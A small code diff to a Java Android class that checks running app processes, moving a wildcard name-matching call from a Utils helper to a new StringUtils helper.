@@ -17,6 +17,7 @@ import android.content.Context;
 
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
+import com.android.networking.util.StringUtils;
 import com.android.networking.util.Utils;
 
 public class RunningProcesses {
@@ -80,7 +81,7 @@ public class RunningProcesses {
 		while (iter.hasNext()) {
 			final ActivityManager.RunningAppProcessInfo element = iter.next();
 
-			if (Utils.matchStar(process, element.processName) == true) {
+			if (StringUtils.matchStar(process, element.processName) == true) {
 				return true;
 			}
 		}
